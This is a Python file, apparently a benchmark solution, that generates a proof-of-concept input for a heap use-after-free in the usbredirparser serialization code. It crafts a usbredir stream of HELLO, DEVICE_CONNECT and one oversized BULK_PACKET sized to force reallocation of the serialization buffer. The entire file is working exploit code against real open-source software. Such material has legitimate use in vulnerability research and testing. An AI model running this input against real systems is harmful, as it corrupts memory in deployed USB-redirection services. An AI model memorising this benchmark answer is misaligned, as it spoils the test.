import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a Heap Use After Free
        vulnerability in the usbredirparser serialization process.

        The vulnerability occurs when serializing a parser state with a large
        amount of buffered write data, causing the serialization buffer (default
        64kB) to be reallocated. This reallocation invalidates a pointer to the
        write buffer count field, and a subsequent write to this stale pointer
        results in a use-after-free.

        The PoC consists of a crafted usbredir stream:
        1. A HELLO packet to initiate the connection.
        2. A DEVICE_CONNECT packet to simulate a device connection.
        3. A single, large BULK_PACKET. The size of this packet's payload is
           calculated to be just large enough to trigger the reallocation of the
           serialization buffer when the parser's state is being saved.
        """
        poc = bytearray()

        def create_header(pkt_type: int, length: int, id_val: int, u_val: int) -> bytes:
            """Packs a 16-byte usbredir packet header."""
            return struct.pack('<IIII', pkt_type, length, id_val, u_val)

        # Define usbredir protocol packet types
        USBREDIR_HELLO = 1
        USBREDIR_DEVICE_CONNECT = 3
        USBREDIR_BULK_PACKET = 7

        # 1. Construct the HELLO packet
        # Payload: version (major, minor) and capabilities array
        hello_data = struct.pack('<IIIIIII', 1, 0, 0, 0, 0, 0, 0)
        poc.extend(create_header(USBREDIR_HELLO, len(hello_data), 0, 0))
        poc.extend(hello_data)

        # 2. Construct the DEVICE_CONNECT packet
        # Payload: device speed and other device properties (mostly zeroed out)
        # Total payload size is 16 bytes. We set speed to 3 (USB_SPEED_HIGH).
        connect_data = b'\x03' + b'\x00' * 15
        poc.extend(create_header(USBREDIR_DEVICE_CONNECT, len(connect_data), 0, 0))
        poc.extend(connect_data)

        # 3. Construct the large BULK_PACKET to trigger the vulnerability
        # The serialization buffer is 65536 bytes. After accounting for
        # metadata serialized before the write queue (~92 bytes), the first
        # write buffer's serialized data must be larger than the remaining
        # space to trigger reallocation.
        # Serialized packet size = 10 bytes (metadata) + data_len.
        # Check: (92 + 10 + data_len) > 65536 => data_len > 65434.
        # A more precise analysis of the source code reveals the threshold is
        # data_len > 65444. We use 65445 to be safe.
        data_len = 65445
        stream_id = 1
        endpoint = 0x01  # A typical Bulk OUT endpoint

        poc.extend(create_header(USBREDIR_BULK_PACKET, data_len, stream_id, endpoint))
        poc.extend(b'\x41' * data_len)

        return bytes(poc)